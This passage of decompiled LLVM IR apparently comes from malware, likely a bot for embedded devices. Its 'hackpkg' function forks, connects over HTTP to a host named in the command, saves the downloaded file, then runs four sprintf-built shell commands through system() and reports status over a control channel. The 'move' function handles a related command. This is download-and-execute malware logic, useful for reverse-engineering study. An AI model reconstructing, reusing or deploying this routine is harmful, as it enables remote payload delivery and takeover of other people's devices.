  uselistorder label %dec_label_pc_1000f658, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f5b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f574, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f400, { 1, 0 }
  uselistorder label %dec_label_pc_1000f400.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000f350, { 1, 0 }
  uselistorder label %dec_label_pc_1000f2f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f2bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f230, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1e8, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000fb68 = icmp sgt i32 %arg3, 0
  br i1 %v2_1000fb68, label %dec_label_pc_1000fb90, label %dec_label_pc_1000fb70

dec_label_pc_1000fb70:                            ; preds = %entry
  %v6_1000fb84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1002c19c.740 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fb8c = call i32 @__GI_exit()
  br label %dec_label_pc_1000fb90

dec_label_pc_1000fb90:                            ; preds = %entry, %dec_label_pc_1000fb70
  %v1_1000fb94 = add i32 %arg4, 4
  %v1_1000fb98 = inttoptr i32 %v1_1000fb94 to i32*
  %v2_1000fb98 = load i32, i32* %v1_1000fb98, align 4
  store i32 268499876, i32* @lr, align 4
  %v1_1000fba0 = call i32 @__GI_strdup(i32 %v2_1000fb98)
  store i32 %v1_1000fba0, i32* @global_var_100451b0.742, align 4
  store i32 1, i32* @global_var_1004516c.743, align 4
  store i32 268499908, i32* @lr, align 4
  %v1_1000fbc0 = call i32 @close(i32 %arg1)
  ret i32 %v1_1000fbc0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb90, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-303 = alloca i32, align 4
  %stack_var_-558 = alloca i32, align 4
  %stack_var_-813 = alloca i32, align 4
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-6196 = alloca i32, align 4
  %stack_var_-6200 = alloca i32, align 4
  %stack_var_-6204 = alloca i32, align 4
  %stack_var_-6248 = alloca i32, align 4
  %stack_var_-6188 = alloca i32, align 4
  %stack_var_-6256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fbdc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000fbdc, i32* %stack_var_-6256, align 4
  store i32 268499992, i32* @lr, align 4
  %v5_1000fc14 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_1002c1b8.744 to i32), i32 509, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v1_1000fc1c = call i32 @mfork(i32 %arg2)
  %v3_1000fc24 = icmp eq i32 %v1_1000fc1c, 0
  br i1 %v3_1000fc24, label %dec_label_pc_1000fc2c, label %dec_label_pc_100102a4

dec_label_pc_1000fc2c:                            ; preds = %entry
  %v2_1000fc30 = icmp sgt i32 %arg3, 1
  br i1 %v2_1000fc30, label %dec_label_pc_1000fc58, label %dec_label_pc_1000fc38

dec_label_pc_1000fc38:                            ; preds = %dec_label_pc_1000fc2c
  %v6_1000fc4c = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002c1c4.745 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fc54 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fc58

dec_label_pc_1000fc58:                            ; preds = %dec_label_pc_1000fc2c, %dec_label_pc_1000fc38
  store i32 268500072, i32* @lr, align 4
  %v3_1000fc64 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_1000fc78 = icmp eq i32 %v3_1000fc64, -1
  br i1 %v4_1000fc78, label %dec_label_pc_1000fc80, label %dec_label_pc_1000fca0

dec_label_pc_1000fc80:                            ; preds = %dec_label_pc_1000fc58
  %v6_1000fc94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a10c.38 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fc9c = call i32 @__GI_exit()
  br label %dec_label_pc_1000fca0

dec_label_pc_1000fca0:                            ; preds = %dec_label_pc_1000fc58, %dec_label_pc_1000fc80
  %v1_1000fca4 = add i32 %arg4, 4
  %v1_1000fca8 = inttoptr i32 %v1_1000fca4 to i32*
  %v2_1000fca8 = load i32, i32* %v1_1000fca8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002a134.40 to i32), i32* @r4, align 4
  %v4_1000fcbc = inttoptr i32 %v2_1000fca8 to i8*
  %v5_1000fcbc = call i32 @__GI_strncmp(i8* %v4_1000fcbc, i32 ptrtoint ([8 x i8]* @global_var_1002a134.40 to i32), i32 7)
  %v3_1000fcc4 = icmp eq i32 %v5_1000fcbc, 0
  %v2_1000fcd4 = load i32, i32* %v1_1000fca8, align 4
  br i1 %v3_1000fcc4, label %dec_label_pc_1000fccc, label %dec_label_pc_1000fcf0

dec_label_pc_1000fccc:                            ; preds = %dec_label_pc_1000fca0
  %v1_1000fcd8 = add i32 %v2_1000fcd4, 7
  %v2_1000fcdc = ptrtoint i32* %stack_var_-6188 to i32
  %v2_1000fce8 = inttoptr i32 %v1_1000fcd8 to i8*
  %v3_1000fce8 = call i32 @strcpy(i32 %v2_1000fcdc, i8* %v2_1000fce8)
  br label %dec_label_pc_1000fd0c

dec_label_pc_1000fcf0:                            ; preds = %dec_label_pc_1000fca0
  %v2_1000fcfc = ptrtoint i32* %stack_var_-6188 to i32
  %v2_1000fd08 = inttoptr i32 %v2_1000fcd4 to i8*
  %v3_1000fd08 = call i32 @strcpy(i32 %v2_1000fcfc, i8* %v2_1000fd08)
  br label %dec_label_pc_1000fd0c

dec_label_pc_1000fd0c:                            ; preds = %dec_label_pc_1000fccc, %dec_label_pc_1000fcf0
  %v2_1000fd28.pre-phi = phi i32 [ %v2_1000fcdc, %dec_label_pc_1000fccc ], [ %v2_1000fcfc, %dec_label_pc_1000fcf0 ]
  %v2_1000fd44 = ptrtoint i32* %stack_var_-6248 to i32
  store i32 %v2_1000fd28.pre-phi, i32* @r3, align 4
  %v0_1000fd3068 = call i32 @__GI_strlen()
  %v2_1000fd3870 = icmp eq i32 %v0_1000fd3068, 0
  br i1 %v2_1000fd3870, label %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge, label %dec_label_pc_1000fd40

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fd40
  %v1_1000fd1c = add i32 %storemerge573, 1
  store i32 %v2_1000fd28.pre-phi, i32* @r3, align 4
  %v0_1000fd30 = call i32 @__GI_strlen()
  %v2_1000fd38 = icmp ult i32 %v1_1000fd1c, %v0_1000fd30
  br i1 %v2_1000fd38, label %dec_label_pc_1000fd40, label %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge

dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge: ; preds = %dec_label_pc_1000fd0c, %dec_label_pc_1000fd18
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000fd0c ], [ %v1_1000fd1c, %dec_label_pc_1000fd18 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_1000fd44
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000fd5c

dec_label_pc_1000fd40:                            ; preds = %dec_label_pc_1000fd0c, %dec_label_pc_1000fd18
  %storemerge573 = phi i32 [ %v1_1000fd1c, %dec_label_pc_1000fd18 ], [ 0, %dec_label_pc_1000fd0c ]
  %v2_1000fd48 = add i32 %storemerge573, %v2_1000fd44
  %v1_1000fd4c = add i32 %v2_1000fd48, 60
  %v2_1000fd4c = inttoptr i32 %v1_1000fd4c to i8*
  %v3_1000fd4c = load i8, i8* %v2_1000fd4c, align 1
  %v3_1000fd54 = icmp eq i8 %v3_1000fd4c, 47
  br i1 %v3_1000fd54, label %dec_label_pc_1000fd5c, label %dec_label_pc_1000fd18

dec_label_pc_1000fd5c:                            ; preds = %dec_label_pc_1000fd40, %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge
  %storemerge567 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge ], [ %storemerge573, %dec_label_pc_1000fd40 ]
  %v4_1000fd6c.pre-phi = phi i8* [ %.pre31, %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge ], [ %v2_1000fd4c, %dec_label_pc_1000fd40 ]
  store i8 0, i8* %v4_1000fd6c.pre-phi, align 1
  store i32 2, i32* %stack_var_-6204, align 4
  store i32 80, i32* @r3, align 4
  %v1_1000fd7c = call i32 @htons(i32 80)
  store i32 268500372, i32* @lr, align 4
  %v1_1000fd90 = call i32 @inet_addr(i32 %v2_1000fd28.pre-phi)
  %v4_1000fda4 = icmp eq i32 %v1_1000fd90, -1
  br i1 %v4_1000fda4, label %dec_label_pc_1000fdac, label %dec_label_pc_1000fe20

dec_label_pc_1000fdac:                            ; preds = %dec_label_pc_1000fd5c
  store i32 268500408, i32* @lr, align 4
  %v1_1000fdb4 = call i32 @__GI_gethostbyname(i32 %v2_1000fd28.pre-phi)
  %v3_1000fdc4 = icmp eq i32 %v1_1000fdb4, 0
  br i1 %v3_1000fdc4, label %dec_label_pc_1000fdcc, label %dec_label_pc_1000fdec

dec_label_pc_1000fdcc:                            ; preds = %dec_label_pc_1000fdac
  %v6_1000fde0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a13c.43 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fde8 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fdec

dec_label_pc_1000fdec:                            ; preds = %dec_label_pc_1000fdac, %dec_label_pc_1000fdcc
  %v2_1000fdf0 = ptrtoint i32* %stack_var_-6200 to i32
  %v1_1000fdf8 = add i32 %v1_1000fdb4, 16
  %v2_1000fdf8 = inttoptr i32 %v1_1000fdf8 to i32*
  %v3_1000fdf8 = load i32, i32* %v2_1000fdf8, align 4
  %v1_1000fdfc = inttoptr i32 %v3_1000fdf8 to i32*
  %v2_1000fdfc = load i32, i32* %v1_1000fdfc, align 4
  store i32 %v2_1000fdfc, i32* %r11.global-to-local, align 4
  %v1_1000fe04 = add i32 %v1_1000fdb4, 12
  %v2_1000fe04 = inttoptr i32 %v1_1000fe04 to i32*
  %v3_1000fe04 = load i32, i32* %v2_1000fe04, align 4
  store i32 %v2_1000fdf0, i32* @r3, align 4
  store i32 %v2_1000fdfc, i32* @r4, align 4
  store i32 %v3_1000fe04, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000fe1c.753 to i32), i32* @lr, align 4
  %v0_1000fe18 = call i32 @memcpy()
  br label %dec_label_pc_1000fe28

dec_label_pc_1000fe20:                            ; preds = %dec_label_pc_1000fd5c
  store i32 %v1_1000fd90, i32* %stack_var_-6200, align 4
  br label %dec_label_pc_1000fe28

dec_label_pc_1000fe28:                            ; preds = %dec_label_pc_1000fdec, %dec_label_pc_1000fe20
  %v2_1000fe28.pre-phi = ptrtoint i32* %stack_var_-6204 to i32
  %v2_1000fe2c = ptrtoint i32* %stack_var_-6196 to i32
  store i32 %v2_1000fe2c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268500544, i32* @lr, align 4
  %v0_1000fe3c = call i32 @__GI_memset()
  store i32 268500564, i32* @lr, align 4
  %v3_1000fe50 = call i32 @connect(i32 %v3_1000fc64, i32 %v2_1000fe28.pre-phi, i32 16)
  %v3_1000fe58 = icmp eq i32 %v3_1000fe50, 0
  br i1 %v3_1000fe58, label %dec_label_pc_1000fe80, label %dec_label_pc_1000fe60

dec_label_pc_1000fe60:                            ; preds = %dec_label_pc_1000fe28
  %v6_1000fe74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a164.47 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fe7c = call i32 @__GI_exit()
  br label %dec_label_pc_1000fe80

dec_label_pc_1000fe80:                            ; preds = %dec_label_pc_1000fe28, %dec_label_pc_1000fe60
  %v2_1000fe88 = add i32 %v2_1000fd28.pre-phi, 1
  %v1_1000fe8c = add i32 %v2_1000fe88, %storemerge567
  store i32 %v2_1000fd28.pre-phi, i32* %r11.global-to-local, align 4
  %v6_1000feac = call i32 @Send(i32 %v3_1000fc64, i32 ptrtoint ([277 x i8]* @global_var_1002c1ec.755 to i32), i32 %v1_1000fe8c, i32 %v2_1000fd28.pre-phi)
  %v6_1000fec4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002a2a0.50 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v1_1000fecc = add i32 %arg4, 8
  %v1_1000fed0 = inttoptr i32 %v1_1000fecc to i32*
  %v2_1000fed0 = load i32, i32* %v1_1000fed0, align 4
  store i32 268500708, i32* @lr, align 4
  %v3_1000fee0 = call i32 @__GI_fopen(i32 %v2_1000fed0, i32 ptrtoint ([3 x i8]* @global_var_1002a2bc.51 to i32))
  %v2_1000feec = ptrtoint i32* %stack_var_-5164 to i32
  br label %dec_label_pc_1000feec

dec_label_pc_1000feec:                            ; preds = %dec_label_pc_10010048, %dec_label_pc_1000fe80
  store i32 268500740, i32* @lr, align 4
  %v4_1000ff00 = call i32 @recv(i32 %v3_1000fc64, i32 %v2_1000feec, i32 4096, i32 0)
  %tmp61 = icmp slt i32 %v4_1000ff00, 1
  br i1 %tmp61, label %dec_label_pc_10010068, label %dec_label_pc_1000ff18

dec_label_pc_1000ff18:                            ; preds = %dec_label_pc_1000feec
  %v2_1000ff1c = icmp sgt i32 %v4_1000ff00, 4095
  br i1 %v2_1000ff1c, label %dec_label_pc_1000ff44.lr.ph, label %dec_label_pc_1000ff24

dec_label_pc_1000ff24:                            ; preds = %dec_label_pc_1000ff18
  %v2_1000ff2c = add i32 %v4_1000ff00, %v2_1000fd44
  %v3_1000ff34 = add i32 %v2_1000ff2c, 1084
  %v4_1000ff34 = inttoptr i32 %v3_1000ff34 to i8*
  store i8 0, i8* %v4_1000ff34, align 1
  br label %dec_label_pc_1000ff44.lr.ph

dec_label_pc_1000ff44.lr.ph:                      ; preds = %dec_label_pc_1000ff24, %dec_label_pc_1000ff18
  br label %dec_label_pc_1000ff44

dec_label_pc_1000ff44:                            ; preds = %dec_label_pc_1000ff44.lr.ph, %dec_label_pc_10010048
  %storemerge625 = phi i32 [ 0, %dec_label_pc_1000ff44.lr.ph ], [ %v1_1001004c, %dec_label_pc_10010048 ]
  %v2_1000ff50 = add i32 %storemerge625, %v2_1000feec
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32* @r4, align 4
  %v4_1000ff64 = inttoptr i32 %v2_1000ff50 to i8*
  %v5_1000ff64 = call i32 @__GI_strncmp(i8* %v4_1000ff64, i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32 4)
  %v3_1000ff6c = icmp eq i32 %v5_1000ff64, 0
  br i1 %v3_1000ff6c, label %dec_label_pc_1000ff74, label %dec_label_pc_10010048

dec_label_pc_1000ff74:                            ; preds = %dec_label_pc_1000ff44
  %v1_1000ff78 = add i32 %storemerge625, 4
  %v2_1001003c18 = icmp slt i32 %v1_1000ff78, %v4_1000ff00
  br i1 %v2_1001003c18, label %dec_label_pc_1000ff84.lr.ph, label %dec_label_pc_10010068

dec_label_pc_1000ff84.lr.ph:                      ; preds = %dec_label_pc_1000ff74
  %v1_1000ff90 = add i32 %v3_1000fee0, 52
  %v2_1000ff90 = inttoptr i32 %v1_1000ff90 to i32*
  %v1_1000ffa0 = add i32 %v3_1000fee0, 16
  %v2_1000ffa0 = inttoptr i32 %v1_1000ffa0 to i32*
  %v1_1000ffa8 = add i32 %v3_1000fee0, 28
  %v2_1000ffa8 = inttoptr i32 %v1_1000ffa8 to i32*
  br label %dec_label_pc_1000ff84

dec_label_pc_1000ff84:                            ; preds = %dec_label_pc_1000ff84.lr.ph, %dec_label_pc_10010028
  %storemerge721 = phi i32 [ %v1_1000ff78, %dec_label_pc_1000ff84.lr.ph ], [ %v1_1001002c, %dec_label_pc_10010028 ]
  %v3_1000ff90 = load i32, i32* %v2_1000ff90, align 4
  %v3_1000ff94 = icmp eq i32 %v3_1000ff90, 0
  br i1 %v3_1000ff94, label %dec_label_pc_10010008, label %dec_label_pc_1000ff9c

dec_label_pc_1000ff9c:                            ; preds = %dec_label_pc_1000ff84
  %v3_1000ffa0 = load i32, i32* %v2_1000ffa0, align 4
  store i32 %v3_1000ffa0, i32* %r11.global-to-local, align 4
  %v3_1000ffa8 = load i32, i32* %v2_1000ffa8, align 4
  %v2_1000ffac = icmp ult i32 %v3_1000ffa0, %v3_1000ffa8
  br i1 %v2_1000ffac, label %dec_label_pc_1000ffb4, label %dec_label_pc_1000ffe4

dec_label_pc_1000ffb4:                            ; preds = %dec_label_pc_1000ff9c
  %v3_1000ffb8 = load i32, i32* %v2_1000ffa0, align 4
  store i32 %v3_1000ffb8, i32* %r11.global-to-local, align 4
  %v2_1000ffc4 = add i32 %storemerge721, %v2_1000fd44
  %v1_1000ffc8 = add i32 %v2_1000ffc4, 1084
  %v2_1000ffc8 = inttoptr i32 %v1_1000ffc8 to i8*
  %v3_1000ffc8 = load i8, i8* %v2_1000ffc8, align 1
  %v3_1000ffd0 = inttoptr i32 %v3_1000ffb8 to i8*
  store i8 %v3_1000ffc8, i8* %v3_1000ffd0, align 1
  %v0_1000ffd4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ffd4 = add i32 %v0_1000ffd4, 1
  store i32 %v1_1000ffd4, i32* %v2_1000ffa0, align 4
  br label %dec_label_pc_10010028

dec_label_pc_1000ffe4:                            ; preds = %dec_label_pc_1000ff9c
  %v2_1000ffec = add i32 %storemerge721, %v2_1000fd44
  %v1_1000fff0 = add i32 %v2_1000ffec, 1084
  %v2_1000fff0 = inttoptr i32 %v1_1000fff0 to i8*
  %v3_1000fff0 = load i8, i8* %v2_1000fff0, align 1
  store i32 ptrtoint (i32* @global_var_10010004.756 to i32), i32* @lr, align 4
  %v4_10010000 = call i32 @putc_unlocked(i8 %v3_1000fff0, i32 %v3_1000fee0, i32 %v2_1000ffec)
  br label %dec_label_pc_10010028

dec_label_pc_10010008:                            ; preds = %dec_label_pc_1000ff84
  %v2_10010010 = add i32 %storemerge721, %v2_1000fd44
  %v1_10010014 = add i32 %v2_10010010, 1084
  %v2_10010014 = inttoptr i32 %v1_10010014 to i8*
  %v3_10010014 = load i8, i8* %v2_10010014, align 1
  store i32 268501032, i32* @lr, align 4
  %v4_10010024 = call i32 @__GI_fputc(i8 %v3_10010014, i32 %v3_1000fee0, i32 %v2_10010010)
  br label %dec_label_pc_10010028

dec_label_pc_10010028:                            ; preds = %dec_label_pc_1000ffe4, %dec_label_pc_1000ffb4, %dec_label_pc_10010008
  %v1_1001002c = add i32 %storemerge721, 1
  %v2_1001003c = icmp slt i32 %v1_1001002c, %v4_1000ff00
  br i1 %v2_1001003c, label %dec_label_pc_1000ff84, label %dec_label_pc_10010068

dec_label_pc_10010048:                            ; preds = %dec_label_pc_1000ff44
  %v1_1001004c = add nuw nsw i32 %storemerge625, 1
  %v2_1001005c = icmp slt i32 %v1_1001004c, %v4_1000ff00
  br i1 %v2_1001005c, label %dec_label_pc_1000ff44, label %dec_label_pc_1000feec

dec_label_pc_10010068:                            ; preds = %dec_label_pc_1000feec, %dec_label_pc_10010028, %dec_label_pc_1000ff74
  %v2_10010070 = load i32, i32* %v1_1000fed0, align 4
  %v6_1001008c = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002c304.757 to i32), i32 %arg2, i32 %v2_10010070)
  %v1_100100f4 = add i32 %v3_1000fee0, 52
  %v2_100100f4 = inttoptr i32 %v1_100100f4 to i32*
  %v1_10010104 = add i32 %v3_1000fee0, 16
  %v2_10010104 = inttoptr i32 %v1_10010104 to i32*
  %v1_1001010c = add i32 %v3_1000fee0, 28
  %v2_1001010c = inttoptr i32 %v1_1001010c to i32*
  br label %dec_label_pc_10010090

dec_label_pc_10010090:                            ; preds = %dec_label_pc_1001018c, %dec_label_pc_10010068
  store i32 268501160, i32* @lr, align 4
  %v4_100100a4 = call i32 @recv(i32 %v3_1000fc64, i32 %v2_1000feec, i32 4096, i32 0)
  %tmp62 = icmp slt i32 %v4_100100a4, 1
  br i1 %tmp62, label %dec_label_pc_100101ac, label %dec_label_pc_100100bc

dec_label_pc_100100bc:                            ; preds = %dec_label_pc_10010090
  %v2_100100c0 = icmp sgt i32 %v4_100100a4, 4095
  br i1 %v2_100100c0, label %dec_label_pc_100100e8.lr.ph, label %dec_label_pc_100100c8

dec_label_pc_100100c8:                            ; preds = %dec_label_pc_100100bc
  %v2_100100d0 = add i32 %v4_100100a4, %v2_1000fd44
  %v3_100100d8 = add i32 %v2_100100d0, 1084
  %v4_100100d8 = inttoptr i32 %v3_100100d8 to i8*
  store i8 0, i8* %v4_100100d8, align 1
  br label %dec_label_pc_100100e8.lr.ph

dec_label_pc_100100e8.lr.ph:                      ; preds = %dec_label_pc_100100c8, %dec_label_pc_100100bc
  br label %dec_label_pc_100100e8

dec_label_pc_100100e8:                            ; preds = %dec_label_pc_100100e8.lr.ph, %dec_label_pc_1001018c
  %storemerge817 = phi i32 [ 0, %dec_label_pc_100100e8.lr.ph ], [ %v1_10010190, %dec_label_pc_1001018c ]
  store i32 %v3_1000fee0, i32* %stack_var_-6248, align 4
  %v3_100100f4 = load i32, i32* %v2_100100f4, align 4
  %v3_100100f8 = icmp eq i32 %v3_100100f4, 0
  br i1 %v3_100100f8, label %dec_label_pc_1001016c, label %dec_label_pc_10010100

dec_label_pc_10010100:                            ; preds = %dec_label_pc_100100e8
  %v3_10010104 = load i32, i32* %v2_10010104, align 4
  store i32 %v3_10010104, i32* %r11.global-to-local, align 4
  %v3_1001010c = load i32, i32* %v2_1001010c, align 4
  %v2_10010110 = icmp ult i32 %v3_10010104, %v3_1001010c
  br i1 %v2_10010110, label %dec_label_pc_10010118, label %dec_label_pc_10010148

dec_label_pc_10010118:                            ; preds = %dec_label_pc_10010100
  %v3_1001011c = load i32, i32* %v2_10010104, align 4
  store i32 %v3_1001011c, i32* %r11.global-to-local, align 4
  %v2_10010128 = add i32 %storemerge817, %v2_1000fd44
  %v1_1001012c = add i32 %v2_10010128, 1084
  %v2_1001012c = inttoptr i32 %v1_1001012c to i8*
  %v3_1001012c = load i8, i8* %v2_1001012c, align 1
  %v3_10010134 = inttoptr i32 %v3_1001011c to i8*
  store i8 %v3_1001012c, i8* %v3_10010134, align 1
  %v0_10010138 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010138 = add i32 %v0_10010138, 1
  %v3_1001013c = load i32, i32* %stack_var_-6248, align 4
  %v2_10010140 = add i32 %v3_1001013c, 16
  %v3_10010140 = inttoptr i32 %v2_10010140 to i32*
  store i32 %v1_10010138, i32* %v3_10010140, align 4
  br label %dec_label_pc_1001018c

dec_label_pc_10010148:                            ; preds = %dec_label_pc_10010100
  %v2_10010150 = add i32 %storemerge817, %v2_1000fd44
  %v1_10010154 = add i32 %v2_10010150, 1084
  %v2_10010154 = inttoptr i32 %v1_10010154 to i8*
  %v3_10010154 = load i8, i8* %v2_10010154, align 1
  store i32 ptrtoint (i32* @global_var_10010168.758 to i32), i32* @lr, align 4
  %v4_10010164 = call i32 @putc_unlocked(i8 %v3_10010154, i32 %v3_1000fee0, i32 %v2_10010150)
  br label %dec_label_pc_1001018c

dec_label_pc_1001016c:                            ; preds = %dec_label_pc_100100e8
  %v2_10010174 = add i32 %storemerge817, %v2_1000fd44
  %v1_10010178 = add i32 %v2_10010174, 1084
  %v2_10010178 = inttoptr i32 %v1_10010178 to i8*
  %v3_10010178 = load i8, i8* %v2_10010178, align 1
  store i32 268501388, i32* @lr, align 4
  %v4_10010188 = call i32 @__GI_fputc(i8 %v3_10010178, i32 %v3_1000fee0, i32 %v2_10010174)
  br label %dec_label_pc_1001018c

dec_label_pc_1001018c:                            ; preds = %dec_label_pc_10010148, %dec_label_pc_10010118, %dec_label_pc_1001016c
  %v1_10010190 = add nuw nsw i32 %storemerge817, 1
  %v2_100101a0 = icmp slt i32 %v1_10010190, %v4_100100a4
  br i1 %v2_100101a0, label %dec_label_pc_100100e8, label %dec_label_pc_10010090

dec_label_pc_100101ac:                            ; preds = %dec_label_pc_10010090
  store i32 268501428, i32* @lr, align 4
  %v1_100101b0 = inttoptr i32 %v3_1000fee0 to i16*
  %v2_100101b0 = call i32 @__GI_fclose(i16* %v1_100101b0)
  store i32 268501436, i32* @lr, align 4
  %v1_100101b8 = call i32 @close(i32 %v3_1000fc64)
  %v2_100101c4 = load i32, i32* %v1_1000fed0, align 4
  store i32 %v2_100101c4, i32* %r11.global-to-local, align 4
  %v2_100101d4 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_100101d4, i32* @r3, align 4
  store i32 268501492, i32* @lr, align 4
  %v1_100101f0 = call i32 @sprintf(i32 %v2_100101d4)
  store i32 268501504, i32* @lr, align 4
  %v1_100101fc = call i32 @system(i32 %v2_100101d4)
  %v2_10010208 = load i32, i32* %v1_1000fed0, align 4
  store i32 %v2_10010208, i32* %r11.global-to-local, align 4
  %v2_1001020c = ptrtoint i32* %stack_var_-813 to i32
  store i32 %v2_1001020c, i32* @r3, align 4
  store i32 268501544, i32* @lr, align 4
  %v1_10010224 = call i32 @sprintf(i32 %v2_1001020c)
  store i32 268501556, i32* @lr, align 4
  %v1_10010230 = call i32 @system(i32 %v2_1001020c)
  %v2_1001023c = load i32, i32* %v1_1000fed0, align 4
  store i32 %v2_1001023c, i32* %r11.global-to-local, align 4
  %v2_10010240 = ptrtoint i32* %stack_var_-558 to i32
  store i32 %v2_10010240, i32* @r3, align 4
  store i32 268501596, i32* @lr, align 4
  %v1_10010258 = call i32 @sprintf(i32 %v2_10010240)
  store i32 268501608, i32* @lr, align 4
  %v1_10010264 = call i32 @system(i32 %v2_10010240)
  %v2_10010270 = load i32, i32* %v1_1000fed0, align 4
  store i32 %v2_10010270, i32* %r11.global-to-local, align 4
  %v2_10010274 = ptrtoint i32* %stack_var_-303 to i32
  store i32 %v2_10010274, i32* @r3, align 4
  store i32 268501648, i32* @lr, align 4
  %v1_1001028c = call i32 @sprintf(i32 %v2_10010274)
  store i32 ptrtoint ([3 x i8]* @global_var_1001029c.763 to i32), i32* @lr, align 4
  %v1_10010298 = call i32 @system(i32 %v2_10010274)
  %v0_100102a0 = call i32 @__GI_exit()
  br label %dec_label_pc_100102a4

dec_label_pc_100102a4:                            ; preds = %entry, %dec_label_pc_100101ac
  %v0_100102bc = phi i32 [ %v1_1000fc1c, %entry ], [ %v0_100102a0, %dec_label_pc_100101ac ]
  %v2_100102a4 = load i32, i32* %stack_var_-6256, align 4
  store i32 %v2_100102a4, i32* %r11.global-to-local, align 4
  ret i32 %v0_100102bc

; uselistorder directives
  uselistorder i32 %v2_10010274, { 1, 0, 2 }
  uselistorder i32 %v2_10010240, { 1, 0, 2 }
  uselistorder i32 %v2_1001020c, { 1, 0, 2 }
  uselistorder i32 %v2_100101d4, { 1, 0, 2 }
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100100a4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_1000ff00, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000feec, { 1, 0, 2 }
  uselistorder i32 %v3_1000fee0, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge573, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000fd1c, { 2, 1, 0 }
  uselistorder i32 %v2_1000fd28.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 4095, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1002a134.40 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_100102a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001018c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100100e8, { 1, 0 }
  uselistorder label %dec_label_pc_10010068, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ff84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff44, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe80, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe28, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdec, { 1, 0 }
